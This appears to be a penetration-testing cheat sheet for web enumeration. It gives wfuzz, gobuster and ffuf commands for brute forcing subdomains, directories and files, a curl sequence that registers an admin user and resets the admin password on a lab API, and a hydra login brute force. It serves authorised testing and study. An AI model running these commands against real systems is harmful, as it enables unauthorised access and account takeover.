# Fingerprinting Web Servers

- Web server version
- Web technology version
- CMS version
- Default Credentials!
- Html source code
- robots.txt
# Virtual Hosting

```bash
wfuzz -t 100 -H 'Host: FUZZ.contoso.com' -w /opt/SecLists/Discovery/DNS/combined_subdomains.txt --hh=? http://contoso.com
```

```bash
gobuster dns -t 100 -w /opt/SecLists/Discovery/DNS/combined_subdomains.txt -d contoso.com
```

```bash
ffuf -t 10 -w /opt/SecLists/Discovery/DNS/subdomains-top1million-110000.txt -u http://contoso.com -H 'Host: FUZZ.contoso.com'
```
# Directory Brute Force

We can use the max entries "combined_directories.txt"
Or we can adjust the entries based on the OS, CMS, etc.
Make recursive search ALWAYS
### With no trailing slash

```
gobuster dir -t 100 -w /opt/SecLists/Discovery/Web-Content/combined_directories.txt -u http://contoso.com/ -o fuzz-directory-root.txt
```

### With trailing slash

```
gobuster dir -t 100 -w /opt/SecLists/Discovery/Web-Content/combined_directories.txt -f -u http://contoso.com/ -o fuzz-directory-root-slash.txt
```

### Post Fuzzing

```
wfuzz -t 100 -w /opt/SecLists/Discovery/Web-Content/combined_directories.txt  http://contoso.com/FUZZ -o fuzz-directory-root-post.txt
```

# Files Brute Force

We can use the max entries "combined_words.txt"
Or we can adjust the entries based on the OS, CMS, etc.
Try as many extensions as technologies found (php,asp,aspx,txt,html) include pdf for interesting files
==Try on every directory found!!==

```
gobuster dir -t 100 -w /opt/SecLists/Discovery/Web-Content/combined_words.txt -f -u http://contoso.com/ -x <extensions> -o fuzz-files-root.txt
```

```
wfuzz -t 100 -w /opt/SecLists/Discovery/Web-Content/combined_words.txt -o fuzz-files-root.txt http://contoso.com/FUZZ.php
```

###  Interesting files

```
pdf
txt
db
config
```
## [[35 LFI|Directory Traversal & LFI]]

# Enumerating and Abusing APIs

Apis can listen to POST requests as GET requests

``` > pattern
{GOBUSTER}/v1
{GOBUSTER}/v2
```

```bash
gobuster dir -u http://192.168.50.16:5002 -w /usr/share/wordlists/dirb/big.txt -p pattern
```

#### Example

```bash
curl -i http://192.168.50.16:5002/users/v1/admin/password
curl -d '{"password":"lab","username":"offsecadmin"}' -H 'Content-Type: application/json'  http://192.168.50.16:5002/users/v1/register
curl -d '{"password":"lab","username":"offsec","email":"pwn@offsec.com","admin":"True"}' -H 'Content-Type: application/json' http://192.168.50.16:5002/users/v1/register
curl -d '{"password":"lab","username":"offsec"}' -H 'Content-Type: application/json'  http://192.168.50.16:5002/users/v1/login
curl -X 'PUT' \
  'http://192.168.50.16:5002/users/v1/admin/password' \
  -H 'Content-Type: application/json' \
  -H 'Authorization: OAuth eyJ0eXAiOiJKV1QiLCJhbGciOiJIUzI1NiJ9.eyJleHAiOjE2NDkyNzE3OTQsImlhdCI6MTY0OTI3MTQ5NCwic3ViIjoib2Zmc2VjIn0.OeZH1rEcrZ5F0QqLb8IHbJI7f9KaRAkrywoaRUAsgA4' \
  -d '{"password": "pwned"}'
curl -d '{"password":"pwned","username":"admin"}' -H 'Content-Type: application/json'  http://192.168.50.16:5002/users/v1/login
```
# Exploitation

Based in all these findings we can search exploits by:
1. OS
2. Web Server version
3. Web Technology
4. CMS Version
5. Search for default credentials
## Login BruteForce

```bash
hydra -l user -P /usr/share/wordlists/rockyou.txt <192.168.50.201> http-post-form "/index.php:fm_usr=user&fm_pwd=^PASS^:Login failed. Invalid"
```

### API